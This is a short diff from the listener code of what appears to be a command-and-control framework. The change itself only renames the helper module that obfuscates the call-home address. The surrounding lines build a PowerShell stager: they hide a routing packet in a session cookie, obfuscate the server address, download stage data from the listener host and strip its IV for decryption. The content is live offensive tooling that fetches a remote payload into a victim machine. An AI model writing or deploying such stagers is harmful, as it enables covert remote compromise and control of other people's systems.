@@ -251,7 +251,7 @@ class Listener(object):
                 # add the RC4 packet to a cookie
                 stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket.decode("UTF-8") }");'
 
-                stager += f"$ser= { data_util.obfuscate_call_home_address(host) };$t='{ stage0 }';"
+                stager += f"$ser= { helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
                 stager += "$data=$wc.DownloadData($ser+$t);"
                 stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
